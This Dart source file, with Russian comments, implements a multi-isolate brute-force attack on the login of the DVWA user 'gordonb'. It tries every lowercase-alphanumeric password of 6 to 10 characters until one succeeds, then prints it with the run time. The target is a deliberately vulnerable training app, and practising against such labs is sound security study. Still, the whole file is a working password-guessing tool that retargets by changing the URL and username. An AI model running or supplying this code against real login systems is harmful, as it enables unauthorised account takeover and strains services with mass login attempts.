import 'dart:async';
import 'dart:isolate';
import 'dart:math' as math;
import 'fetching_util.dart';

final class GenerationUtil {
  final String baseUrl;
  final String userToken;
  final int threadCount;
  final NetworkUtil networkUtil;

  static const letters = 'abcdefghijklmnopqrstuvwxyz0123456789';
  static const int charSetLength = letters.length;
  static const int minLength = 6;
  static const int maxLength = 10;

  GenerationUtil({
    required this.baseUrl,
    required this.userToken,
    required this.threadCount,
    required this.networkUtil,
  });

  // Входная функция изолята
  Future<void> _isolateEntry(List<dynamic> args) async {
    final sendPort = args[0] as SendPort;
    final baseUrl = args[1] as String;
    final userToken = args[2] as String;
    final startLength = args[3] as int;
    final maxLength = args[4] as int;
    final threadIndex = args[5] as int;
    final totalThreads = args[6] as int;

    for (int length = startLength; length <= maxLength; length++) {
      final totalCombinations = math.pow(charSetLength, length).toInt();

      for (int index = threadIndex; index < totalCombinations; index += totalThreads) {
        final password = _generatePassword(index, length);

        // Попытка авторизации
        final success = await networkUtil.attemptLogin(
          baseUrl,
          'gordonb',
          password,
          userToken,
        );

        if (success) {
          sendPort.send(password);
          return;
        }
      }
    }

    sendPort.send(null); // Если пароль не найден
  }

  // Генерация пароля по индексу и длине
  static String _generatePassword(int index, int length) {
    final buffer = StringBuffer();

    for (int i = 0; i < length; i++) {
      buffer.write(letters[index % charSetLength]);
      index ~/= charSetLength;
    }

    return buffer.toString().split('').reversed.join(); // Обратный порядок символов
  }

  // Запуск изолятов
  Future<void> bruteForceDVWA() async {
    final stopwatch = Stopwatch()..start();
    final receivePort = ReceivePort();
    final isolates = <Isolate>[];

    for (int i = 0; i < threadCount; i++) {
      final isolate = await Isolate.spawn(_isolateEntry, [
        receivePort.sendPort,
        baseUrl,
        userToken,
        minLength,
        maxLength,
        i,
        threadCount,
      ]);
      isolates.add(isolate);
    }

    String? foundPassword;

    await for (final result in receivePort) {
      if (result != null) {
        foundPassword = result as String?;
        break;
      }
    }

    for (final isolate in isolates) {
      isolate.kill(priority: Isolate.immediate);
    }
    receivePort.close();
    stopwatch.stop();

    if (foundPassword != null) {
      print('Пароль найден: $foundPassword');
    } else {
      print('Пароль не найден.');
    }
    print('Время выполнения: ${stopwatch.elapsed}');
  }
}
